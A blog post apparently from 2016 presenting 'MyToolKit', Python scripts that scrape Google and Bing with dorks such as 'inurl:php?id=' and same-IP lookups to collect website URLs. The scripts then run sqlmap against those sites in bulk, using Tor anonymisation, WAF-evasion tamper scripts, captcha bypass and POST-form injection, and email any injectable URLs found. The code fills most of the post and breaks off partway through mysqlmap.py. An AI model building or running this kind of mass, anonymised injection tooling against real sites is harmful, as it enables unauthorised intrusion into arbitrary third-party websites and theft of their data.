---
layout:     post
title:      MyToolKit
date:       2016-04-15
summary:    MyToolKit's code here
categories: python
tags:
 - python
 - sqlmap
 - scan
---




1.本工具包括6个模块:
---------
      easy_search.py,
      my_bing_domains_v1_alone.py,
      my_GoogleScraper_bing_domain.py,
      mysqlmap.py,
      MyToolKit.py,
      mail.py

2.各模块介绍:
------------

### 1>easy_search.py:

```
google关键字搜索相关网页结果,并对结果通过sqlmap注入,类似啊D里的搜索注入功能,但比啊D里强大,因为这里用sqlmap检测注入并注入,其中google搜索的功能采用完全模仿浏览器方式,可得到所有通过浏览器Google搜索的结果,通过GoogleScraper模块实现,其中GoogleScraper利用 Selenium模块模拟 浏览器人工访问功能.
```

### 2>my_bing_domains_v1_alone.py:  

```
通过bing的api接口原理实现,需要注册bing的api_key,每个月免费5000次.
```

### 3>my_GoogleScraper_bing_domain.py:

    通过GoogleScraper的浏览器模拟人工访问bing,关键字ip:111.111.111.111,获取所有
    结果,当只有一页结果 时,GoogleScraper不能得到该查询结果,调用上面的my_bing_dom
    ains_v1_alone.py模块继续查询.

### 4>mysqlmap.py:

    sqlmap自动化sqli模块,详情见代码.

### 5>MyToolKit.py:

    综合入口模块,选择不同需求,实现不同功能.共包括8个功能,分别为:
    --exp:
      批量使用exp功能 
    --mygoogle 
      --sqlmap-crawl:
        使用my_GoogleScraper_bing_domain.py模块和sqlmap的crawl功能实现批量自动化
        自动化sqli
      --sqlmap-g-nohuman:
        使用my_GoogleScraper_bing_domain.py模块和sqlmap的-g选项功能实现批量自动化
        sqli.
      --sqlmap-g-human:
        使用my_GoogleScraper_bing_domain.py模块和可绕过验证码的GoogleScraper,人工,,输入验证码,获取所有url,用sqlmap的
        -m选项功能实现批量自动化sqli.
    --mybing
      --sqlmap-crawl:
        使用my_bing_domains_v1_alone.py模块和sqlmap的crawl功能实现批量自动化sqli.
      --sqlmap-g-nohuman:
        使用my_bing_domains_v1_alone.py模块和sqlmap的-g选项功能实现批量自动化sqli
      --sqlmap-g-human:
        使用my_bing_domains_v1_alone.py模块 和可绕过验证码的 GoogleScraper,人工输入验证码,获取所有url,用sqlmap的-m选项
        功能实现批量自动化sqli.
    --easy_search:
      相当于--mygoogle下的--sqlmap-g-human功能的子功能,但灵活性更强,可任意关键字google搜索并利用sqlmap注入. 最常用功能
      应该是--mygoogle下的--sqlmap-g-human及--easy_search这两个.

### 6>mail.py:

    自动发送邮件,内嵌在MytoolKit.py中.

3.环境要求: 
------------
    安装GoogleScraper(python3下),并修改部分GoogleScraper中第三方模块selenium中代码(绕过验证码)可参考以前一篇写的关于google search api for python的文章90sec
    链接:https://forum.90sec.org/forum.php?mod=viewthread&tid=9024 百度网盘链接
    https://pan.baidu.com/s/1kUklzZD 密码: 4cpn

### 2016.1.26部分代码更新

### 2016.1.28部分代码更新

```
1.添加tor匿名功能,可自由选择tor或不用tor
```

### 2016.1.28部分代码更新,增加功能:

    1.绕过"多次错误访问后屏蔽所有请求"
    2.请求延时
    3.尝试绕过waf
    4.支持post注入

### 2016.1.29部分代码更新,增加功能:

    1.定位旁站的sqli所在主站
    2.发送邮件通知功能,将可用sqli的url发送邮件通知(smtp用163)

### 2016.3.2部分代码更新:

    1.easy_search.py line:116 添加自动结束冗余firefox进程功能 
    2.修改mysqlmap.py中line:131-161的逻辑错误 
    3.修改其它py中fp=open()以后没有fp.close()的错误 
    4.修改MyToolKit.py中对easy_search.py调用的逻辑错误 
    5.关键字由php|asp变成php|asp|aspx|jsp 
    6.修改my_bing_domains_v1_alone.py中get_the_one_targe_domains函数使用遇到不工
      作的域名解析异常使全局出错的错误 line:21-22
    7.自动处理output目录移动,使得运行前不必清空output目录
    8.修改my_bing_domains_v1_alone.py中get_the_one_targe_domains函数

4.相应代码:
-------------

1>easy_search.py

```python
#need py3 coz GoogleScraper need py3 with selenium module changed to make it possible
#to supass yanzhengma
#easy_search.py is stronger than combineGoogleScraper_myurlhandle.py
#coz the latter can get the https_url only while easy_search.py can get 
#the three kinds of url_list and txt
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
#function:
#this script get the GoogleScraper_origin_https_domain_url_list.txt 
#that is a file with urls which can be directly thrown into sqlmap to start
#dig sqli(s),and the urls are from google search,eg.
#when you run easy_search.py,you need supply keyword for google search,
#then the result is those urls from this google search,the result file is 
#GoogleScraper_origin_https_domain_url_list.txt. 
#need py3 coz GoogleScraper need py3 with selenium module changed to make it possible
#to supass yanzhengma
#easy_search.py is stronger than combineGoogleScraper_myurlhandle.py
#coz the latter can get the https_url only while easy_search.py can get
#the three kinds of url_list and txt
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
#function:
#this script get the GoogleScraper_origin_https_domain_url_list.txt
#that is a file with urls which can be directly thrown into sqlmap to start
#dig sqli(s),and the urls are from google search,eg.
#when you run easy_search.py,you need supply keyword for google search,
#then the result is those urls from this google search,the result file is
#GoogleScraper_origin_https_domain_url_list.txt.
import sys
def save_url_to_file(url_list,name):
    file=open(name,"a+")
    file.close()
    for ur in url_list:
        file=open(name,"r+")
        all_lines=file.readlines()
        print(all_lines)
        print(len(all_lines))
        file.close()

        #if ur+"\r\n" not in all_lines:
        if ur+"\n" not in all_lines:
            #print(type(ur))
            #print(type("\r\n"))
            #print(type(ur+"\r\n"))
            file=open(name,"a+")
            #print 11112212
            print(ur)
            file.write(ur+"\r\n")
            file.flush()
            file.close()




def myGoogleScraper_get_urls_from_query(query,want):
	keyword=query
	num_page=50
	method='selenium'
	browser='firefox'
	from GoogleScraper import scrape_with_config, GoogleSearchError

	# See in the config.cfg file for possible values
	config = {
	    'use_own_ip': True,
	    'keyword': keyword,
	    'search_engines': ['google'],#google,yahoo,baidu,bing...is ok,see GoogleScraper source.
	    'num_pages_for_keyword': num_page,
	    'scrape_method': method,
	    'sel_browser': browser,
	    'do_caching': False
	}

	try:
	    search = scrape_with_config(config)
	    #print(11)
	except GoogleSearchError as e:
	    print(e)

	# let's inspect what we got
	'''
	for serp in search.serps:
	    print(serp)
	    print(serp.search_engine_name)
	    print(serp.scrape_method)
	    print(serp.page_number)
	    print(serp.requested_at)
	    print(serp.num_results)

	    # ... more attributes ...

	    for link in serp.links:
	        #link=link.split(">")[]
	        #print(type(link))
	        print(link.link)
	        all_urls.append(link.link)
	'''
	GoogleScraper_domain_list=[]
	GoogleScraper_https_domain_list=[]
	GoogleScraper_origin_https_domain_url_list=[]
	all_three_list=[]

	for serp in search.serps:
		for link in serp.links:
			if "https://" in link.link:
			    domain=(link.link)[8:-1].split('/')[0]
			    #print("domain=(link.link)[8:-1].split('/')[0] is:")
			    #print(domain)
			    if domain not in GoogleScraper_domain_list:
			    	GoogleScraper_domain_list.append(domain)
			    	GoogleScraper_https_domain_list.append("https://"+domain)
			    #attention!here is not the same from the bing_search_domin script,
			    #coz we need as much url as possible for sqlmap to try to exploit,
			    #so the origin_https_domain_url_list here will add all of the result,
			    #though the domain is the same,different url is needed.
			    GoogleScraper_origin_https_domain_url_list.append(link.link)
			else:
			    domain=(link.link)[7:-1].split('/')[0]
			    #print("domain=(link.link)[7:-1].split('/')[0] is:")
			    #print(domain)
			    if domain not in GoogleScraper_domain_list:
			        GoogleScraper_domain_list.append(domain)
			        GoogleScraper_https_domain_list.append("https://"+domain)
			    #attention!here is not the same from the bing_search_domin script,
			    #coz we need as much url as possible for sqlmap to try to exploit,
			    #so the origin_https_domain_url_list here will add all of the result,
			    #though the domain is the same,different url is needed.
			    GoogleScraper_origin_https_domain_url_list.append(link.link)

	save_url_to_file(GoogleScraper_domain_list,"GoogleScraper_domain_list.txt")
	save_url_to_file(GoogleScraper_https_domain_list,"GoogleScraper_https_domain_list.txt")
	save_url_to_file(GoogleScraper_origin_https_domain_url_list,"GoogleScraper_origin_https_domain_url_list.txt")
	all_three_list.append(GoogleScraper_domain_list)
	all_three_list.append(GoogleScraper_https_domain_list)
	all_three_list.append(GoogleScraper_origin_https_domain_url_list)

	import os
	#although os.system("pkill firefox") maybe ok,
	#this is a good chance to learn awk&xargs,meanwhile,
	#os.system("pkill firefox") is not ok here,but below is ok enough
	#to kill all firefox when it lost into stuck.
	os.system('''ps -aux | grep firefox | awk '{print $2}' | xargs kill -9''')
	#os.system("pkill firefox")

	if want=='GoogleScraper_domain_list.txt':
		return all_three_list[0]
	elif want=='GoogleScraper_https_domain_list':
		return all_three_list[1]
	elif want=='GoogleScraper_origin_https_domain_url_list':
		return all_three_list[2]
	else:
		return all_three_list[2]

def usage():
	print('''input your keyword directly after the script,
		example:%s site:www.xxx.ooo inurl:php?id=''' % sys.argv[0])
	sys.exit(0)
def main():
	#print("sys.argv[1] is type:%s" % type(sys.argv[1]))
	para_num=len(sys.argv)
	keyword=""
	for i in range(para_num-1):
		keyword=keyword+sys.argv[i+1]
		if i+1<para_num-1:
			keyword+=" "
	#print keyword

	myGoogleScraper_get_urls_from_query(keyword,want='GoogleScraper_origin_https_domain_url_list')

if __name__ == '__main__':
	if len(sys.argv)==0:
		usage()
	main()








```

2>my_bing_domains_v1_alone.py

```python
# -*- coding: utf-8 -*-
#need python2(my system is py2.7 by default)
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python

import urllib
import urllib2
import json
import sys
import re
import socket
def main():    
    if len(sys.argv)!=2:
        usage()
        sys.exit(0)
    
    try:
        file=open(sys.argv[1],"r+")
        target_list=file.readlines()
        file.close()
        true_target_list=[]
        true_target_list=get_pure_list(target_list)
        for each in true_target_list:
            try:
                get_the_one_target_domains(each)
            except:
                print "getip or socket.gethostbyname_ex wrong,the site may break down,you can check it."
    except:
        sharedHost=sys.argv[1]
        get_the_one_target_domains(sharedHost)
        print "open file wrong coz this input is not a file but a domain or when you do put a file,then the script open file wrong"
    
        

    
    
    
def get_the_one_target_domains(sharedHost):
    domain_list=[]
    https_domain_list=[]
    origin_https_domain_url_list=[]
    ip=getIp(sharedHost)
    all_nics_ip=socket.gethostbyname_ex(sharedHost)[2]
    #whether sharedHost is hostname or ip appereance,
    #getIP function is ok to get "ip" appereance like x.x.x.x 
    query = "ip:%s" % ip

    #print "query is %s" % query


    
    for piece in bing_search(query, 'Web'):
        if "https://" in piece['Url']:
            
            domain=piece['Url'][8:-1].split('/')[0]
            #print '11111111111111111111111111111111111111:'+domain+'333333:'+getIp(domain)
            #if domain not in domain_list:# and getIp(domain)==ip
            if domain not in domain_list and getIp(domain) in all_nics_ip:
                domain_list.append(domain)     
                https_domain_list.append("https://"+domain)
                origin_https_domain_url_list.append(piece['Url'])
              
            
        else:
            domain=piece['Url'][7:-1].split('/')[0]
            #print '222222222222222222222222222222222222222:'+domain+'333333:'+getIp(domain)
            #if domain not in domain_list:# and getIp(domain)==ip
            if domain not in domain_list and getIp(domain) in all_nics_ip:                
                domain_list.append(domain)
                https_domain_list.append("https://"+domain)
                origin_https_domain_url_list.append(piece['Url'])
    #in the upon for circle,function getIp is ok ,but sometimes we will get two diffirent address
    #when ping some domain,eg.ping defendmainstreet.com  !sometimes we get ip:104.25.209.15
    #sometimes we get 104.25.208.15,this is a strange thing ,may be there exists two NICs on the 
    #same domain,so here ,without check"and getIp(domain)==ip" is better to gain more results
    #although this will get little useless domain.eg. when we try to find the domains of www.baidu.com
    #we will find there would be a domain named "msh.baidu.com",both "k8" and this script will get it,
    #but actually,we can get msh.baidu.com is not the same ip than www.baidu.com by pinging them.
    #if here we don't use check"and getIp(domain)==ip",however,the better and best result chioce is,
    #don't use check"getIp(domain)==ip",finally,this tool is better than k8 from experiment.
    

    #later i found those comments upon are right ,and there exists a better solution,
    #that is use function "gethostbyname_ex",
    #more info see https://walkerqt.blog.51cto.com/1310630/1686735

    #print "getip(192.168.0.1)is :%s" % getIp("192.168.0.1")
    print "domain list is:" 
    for pie in domain_list:
        print pie
    print "https_domain_list is:"
    for pie in https_domain_list:
        print pie
    save_url_to_file(domain_list,"bing_domain_list.txt")
    save_url_to_file(https_domain_list,"bing_https_domain_list.txt")
    save_url_to_file(origin_https_domain_url_list,"bing_origin_https_domain_url_list.txt")


    #now we get the domain_list,https'url's domain included,
    #and saved the urls to file
    

    #print bing_search(query, 'Image')



#this is a function to get a ip from a domain

def getIp(domain):
    import socket   
    try:
        myaddr=socket.getaddrinfo(domain,'https')[0][4][0]
        return myaddr
    except:
        print "getip wrong5555555555555555"


#this is a function to remove \r\n or \n from one sting
def get_pure_list(list):
    pure_list=[]
    for each in list:
        each=re.sub(r'(https://)|(https://)|(\s)|(/.*)|(:.*)',"",each)
        pure_list.append(each)
        #re.sub(r'\r\n',"",each)
        #re.sub(r'\n',"",each)
    return pure_list

#this is my write url to file function:
def save_url_to_file(url_list,name):
    file=open(name,"a+")
    file.close()   
    for ur in url_list:
        file=open(name,"r+")  
        '''
        python3下不可写成"ab+",although in linux,且"a+"不能支持readlines,读不出来数据,i chosed "a+" for file write,and close file,then "r+" for f.readlines(),
        于是python3下还得事先创建url.txt,因为上面的"r+"会发现没有urls.txt文件
        file=open("urls.txt","ab+")  python2 下可以"ab+" 
        '''
        all_lines=file.readlines()
        print(all_lines)
        print(len(all_lines))
        file.close()

        #if ur+"\r\n" not in all_lines:
        if ur+"\n" not in all_lines:
            '''
            python3下write(ur+"\r\n")也只能在字符串后加到"\n",不会加上"\r\n",python2下write(ur+"\r\n")是加上"\r\n"
            所以python2下的if ur+"\r\n" not in all_lines要写成if ur+"\n" not in all_lines
            '''
            #print(type(ur))
            #print(type("\r\n"))
            #print(type(ur+"\r\n"))
            file=open(name,"a+")
            '''
            file.write(ur+"\r\n"),python3下写成 ur+"\r\n" 或 ur+"\n" 效果一样
            写成+"\n"则产生的文件放到windows下看不到换行的效果(形如https://xxx.xxx.xxxhtt://xxx.xxx.xxx),实际处理起来(读文件)好像也是
            有"按换行读的效果的,file.write(ur+"\r\n")会写成'https://twitter.com\n', 'https://twitter.com\n', 'https://twitter.com/hashtag\n'的效果"

            '''
            #print 11112212
            print ur
            file.write(ur+"\r\n")
            file.flush()
            file.close()





#blew is the main function to search use bing api


def bing_search(query, search_type):
    #search_type: Web, Image, News, Video
    key= 'xxxxxxxxxx'
    query = urllib.quote(query)
    #print "bing_search s query is %s" % query
    # create credential for authentication
    user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'
    credentials = (':%s' % key).encode('base64')[:-1]
    auth = 'Basic %s' % credentials
    print auth
    url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/'+search_type+'?Query=%27'+query+'%27&$top=100&$format=json' #&$top=5&$format=json'
    request = urllib2.Request(url)
    request.add_header('Authorization', auth)
    request.add_header('User-Agent', user_agent)
    request_opener = urllib2.build_opener()
    response = request_opener.open(request) 
    response_data = response.read()
    json_result = json.loads(response_data)
    result_list = json_result['d']['results']
    
    return result_list
 



def usage():
    print "-----------------------------------------------------------"
    print "this is a py script to gain domains from the same ip\nusage:"
    print "example:python %s xxx.xxx.xxx" % sys.argv[0]
    print "example:python %s file.txt" % sys.argv[0]
    print "-----------------------------------------------------------"
if __name__ == "__main__":
    main()
```

3>my_GoogleScraper_bing_domain.py

```python
#need python3 coz GoogleScraper require it.
#and python3 with GoogleScraper unchanged selenium version python environment,
#coz bing does not need supass yanzhengma
#on this computer is "workon virtualenv2"
#/root/myenv2/bin/python3.5m
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python

import socket
import re
import sys
import os 


def usage():
    print("-----------------------------------------------------------")
    print("this is a py script to gain domains from the same ip\nusage:")
    print("example:python %s xxx.xxx.xxx" % sys.argv[0])
    print("example:python %s -f file.txt" % sys.argv[0])
    print("-----------------------------------------------------------")


 #this is a function to remove \r\n or \n from one sting   
def get_pure_list(list):
    pure_list=[]
    for each in list:
        each=re.sub(r'(https://)|(https://)|(\s)|(/.*)|(:.*)',"",each)
        pure_list.append(each)
        #re.sub(r'\r\n',"",each)
        #re.sub(r'\n',"",each)
    return pure_list
#this is a function to save url_list to file
def save_url_to_file(url_list,name):
    file=open(name,"a+")
    file.close()   
    for ur in url_list:
        file=open(name,"r+")  
        '''
        python3下不可写成"ab+",although in linux,且"a+"不能支持readlines,读不出来数据,i chosed "a+" for file write,and close file,then "r+" for f.readlines(),
        于是python3下还得事先创建url.txt,因为上面的"r+"会发现没有urls.txt文件
        file=open("urls.txt","ab+")  python2 下可以"ab+" 
        '''
        all_lines=file.readlines()
        print(all_lines)
        print(len(all_lines))
        file.close()

        #if ur+"\r\n" not in all_lines:
        if ur+"\n" not in all_lines:
            '''
            python3下write(ur+"\r\n")也只能在字符串后加到"\n",不会加上"\r\n",python2下write(ur+"\r\n")是加上"\r\n"
            所以python2下的if ur+"\r\n" not in all_lines要写成if ur+"\n" not in all_lines
            '''
            #print(type(ur))
            #print(type("\r\n"))
            #print(type(ur+"\r\n"))
            file=open(name,"a+")
            '''
            file.write(ur+"\r\n"),python3下写成 ur+"\r\n" 或 ur+"\n" 效果一样
            写成+"\n"则产生的文件放到windows下看不到换行的效果(形如https://xxx.xxx.xxxhtt://xxx.xxx.xxx),实际处理起来(读文件)好像也是
            有"按换行读的效果的,file.write(ur+"\r\n")会写成'https://twitter.com\n', 'https://twitter.com\n', 'https://twitter.com/hashtag\n'的效果"

            '''
            #print 11112212
            print(ur)
            file.write(ur+"\r\n")
            file.flush()
            file.close()
#this is a function to get a ip from a domain
def getIp(domain):    
    #the below function getaddrinfo may not be good as function gethostbyname
    try:
    	myaddr=socket.getaddrinfo(domain,'https')[0][4][0]
    	return myaddr
    except:
    	pass





#start from here actually if there is a main entrance

def myGoogleScraperbingdomains():
    print('''make sure your ip will be recognized as useful ip to visit www.bing.com
 otherwise,you need use a vpn which will be treated as a ip can visit www.bing.com and
 will not turn you to cn.bing.com from www.bing.com,another way is use torbrowser instead
 of firefox explorer''')
    if len(sys.argv)!=2 and sys.argv[1]!='-f':
        usage()
        sys.exit(0)
    if sys.argv[1]=='-f':
        try:
            print("444444444444success here")
            file=open(sys.argv[2],"r+")
            print("555555555555success here")
        except:
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!sys.argv[2] is %s" % sys.argv[2])
            print("open file wrong")
            sys.exit(0)

        target_list=file.readlines()
        print("66666666666target_list is:%s" % target_list)
        file.close()
        true_target_list=[]
        true_target_list=get_pure_list(target_list)
        print("77777777777777pure_list is:%s" % true_target_list)
        for each_domain in true_target_list:
        	try:
        		keyword="ip:"+getIp(each_domain)
        		num_page=50
        		method='selenium'
        		browser='firefox'
        	except:
        		continue
        	print("33333333333333success here")
        	get_the_one_target_domains(each_domain,keyword,num_page,method,browser)
        	

    else:
        #print("please input the domain you want bing to search,eg.www.baidu.com:")#ip:111.111.111.111
        #sharedHost=input()
        sharedHost=sys.argv[1]
        keyword="ip:"+socket.gethostbyname(sharedHost)        
        print("please input the number of pages you want bing to search:")
        num_page=int(input())
        print("please input the method you want bing to search {https,selenium,https-async} :")
        method=input()
        print("please input the browser you want google to use,this take \
        	effects only in [selenium] method,[https] or [https-async] any \
        	is ok,coz take no effects,input one of {firefox,chrome,phantomjs} here:")
        browser=input()
        get_the_one_target_domains(sharedHost,keyword,num_page,method,browser)
    
    os.system('''ps -aux | grep firefox | awk '{print $2}'| xargs kill -9''')




def get_the_one_target_domains(sharedHost,keyword,num_page,method,browser):
	sharedHost=sharedHost
	keyword=keyword
	num_page=num_page
	method=method
	browser=browser

	all_nics_ip=socket.gethostbyname_ex(sharedHost)[2]	
	all_urls=[]
	
	from GoogleScraper import scrape_with_config, GoogleSearchError
	
	# See in the config.cfg file for possible values
	config = {
	    'use_own_ip': True,
	    'keyword': keyword,
	    'search_engines': ['bing'],#google,yahoo,baidu,bing...is ok,see GoogleScraper source.
	    'num_pages_for_keyword': num_page,
	    'scrape_method': method,
	    'sel_browser': browser,
	    'do_caching': False
	}
	
	try:
	    search = scrape_with_config(config)
	    #print(11)
	except GoogleSearchError as e:
	    print(e)
	
	# let's inspect what we got
	'''
	for serp in search.serps:    
	    print(serp)
	    print(serp.search_engine_name)
	    print(serp.scrape_method)
	    print(serp.page_number)
	    print(serp.requested_at)
	    print(serp.num_results)
	    
	    # ... more attributes ...
	
	    for link in serp.links:
	        #link=link.split(">")[]
	        #print(type(link))
	        print(link.link)
	        all_urls.append(link.link)
	'''  
	

	GoogleScraper_bing_domain_list=[]
	GoogleScraper_bing_https_domain_list=[]
	GoogleScraper_bing_origin_https_domain_url_list=[]
	
	for serp in search.serps:
	    #print(11)
	    #print(serp)
	    for link in serp.links:        
	        if "https://" in link.link:            
	            domain=(link.link)[8:-1].split('/')[0]
	            #print("domain=(link.link)[8:-1].split('/')[0] is:")
	            #print(domain)
	            try:
	            	ip=getIp(domain)
	            except:
	            	continue
	            if domain not in GoogleScraper_bing_domain_list and ip in all_nics_ip:
	                GoogleScraper_bing_domain_list.append(domain)     
	                GoogleScraper_bing_https_domain_list.append("https://"+domain)
	                GoogleScraper_bing_origin_https_domain_url_list.append(link.link)
	        else:
	            domain=(link.link)[7:-1].split('/')[0]
	            #print("domain=(link.link)[7:-1].split('/')[0] is:")
	            #print(domain)
	            try:
	            	ip=getIp(domain)
	            except:
	            	continue

	            if domain not in GoogleScraper_bing_domain_list and ip in all_nics_ip:                
	                GoogleScraper_bing_domain_list.append(domain)
	                GoogleScraper_bing_https_domain_list.append("https://"+domain)
	                GoogleScraper_bing_origin_https_domain_url_list.append(link.link)


	print("GoogleScraper_bing_domain list is:")
	for pie in GoogleScraper_bing_domain_list:
	    print(pie)
	print("GoogleScraper_bing_https_domain_list is:")
	for pie in GoogleScraper_bing_https_domain_list:
	    print(pie)
	print("GoogleScraper_bing_origin_https_domain_url_list is:")
	for pie in GoogleScraper_bing_origin_https_domain_url_list:
	    print(pie)

	print(555555)
	#sometimes when there are only one page result in the browser,the GoogleScraper 
	#does not work well,so blew we can import "my_bing_domains_v1" module to use
	#normal bing_api to get the domain with only one page result in the browser when
	#we used GoogleScraper's bing_domain search
	if len(GoogleScraper_bing_domain_list)==0:
		#print(6666666666)
		os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % sharedHost)
		print(6666666666)
		'''
		import my_bing_domains_v1		
		GoogleScraper_bing_domain_list=((my_bing_domains_v1.get_the_one_target_domains)(sharedHost))[0]
		print(6666666666)
		GoogleScraper_bing_https_domain_list=((my_bing_domains_v1.get_the_one_target_domains)(sharedHost))[1]
		GoogleScraper_bing_origin_https_domain_url_list=((my_bing_domains_v1.get_the_one_target_domains)(sharedHost))[2]
		'''
	save_url_to_file(GoogleScraper_bing_domain_list,"GoogleScraper_bing_domain_list.txt")
	save_url_to_file(GoogleScraper_bing_https_domain_list,"GoogleScraper_bing_https_domain_list.txt")
	save_url_to_file(GoogleScraper_bing_origin_https_domain_url_list,"GoogleScraper_bing_origin_https_domain_url_list.txt")




if __name__ == "__main__":
    myGoogleScraperbingdomains()
```

4>mysqlmap.py

```python
#works in python 3(selenium changed version,that's myenv)
#coz line53 & line73 use a function from a py3 module,but
#that is not necessary
#in this script file in sqlmap_string,added --tor --tor-type=socks5 --check-tor ,
#other way to add the same effort is:proxychains sqlmap ...
#but this needs the system install proxychains,kali linux2.0 has already installed it,yet
#another way:sqlmap --proxy=socks5://127.0.0.1:9050 (with tor installed in the system)
#
#/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
import os
import re
def static_sqli(url):
	#re.search("",url)
	pass

def sqlmap_g_nohuman(https_url_or_file,tor_or_not,post_or_not):
	#this function use sqlmap's "-g" option to find sqli urls,but this "-g"
	#option can only get 100 results due to google api restriction,but in 
	#this mode,there is no need for us human to handle any situation.
	if re.match("(https://)|(https://)",https_url_or_file):
		domain_url=https_url_or_file[7:] if re.match("(https://)",https_url_or_file) else https_url_or_file[8:]
		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,https_url_or_file)
		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,https_url_or_file)
		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,https_url_or_file)
		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,https_url_or_file)
		#print("sqlmap_string is:%s" % sqlmap_string)
		#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
		if tor_or_not==False:
			print("sqlmap_string is:%s" % sqlmap_string)
			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
			if post_or_not==True:
				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
		elif tor_or_not==True:
			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
			if post_or_not==True:
				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)

	else:
		fp=open(https_url_or_file,"r+")
		all_urls=fp.readlines()
		fp.close()
		for each in all_urls:			
			domain_url=each[7:] if re.match("(https://)",each) else each[8:]
			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,each)
			forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,each)
			tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,each)
			tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,each)
			#print("sqlmap_string is:%s" % sqlmap_string)
			#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
			if tor_or_not==False:
				print("sqlmap_string is:%s" % sqlmap_string)
				print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
				if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)

			elif tor_or_not==True:
				print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
				print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
				if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)

def sqlmap_craw(origin_https_url_or_file,tor_or_not,post_or_not):
	#this function use sqlmap's "--crawl" option to find sqli urls.
	if re.match("(https://)|(https://)",origin_https_url_or_file):
		origin_https_url=re.sub(r'(\s)',"",origin_https_url_or_file)
		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_https_url,origin_https_url)
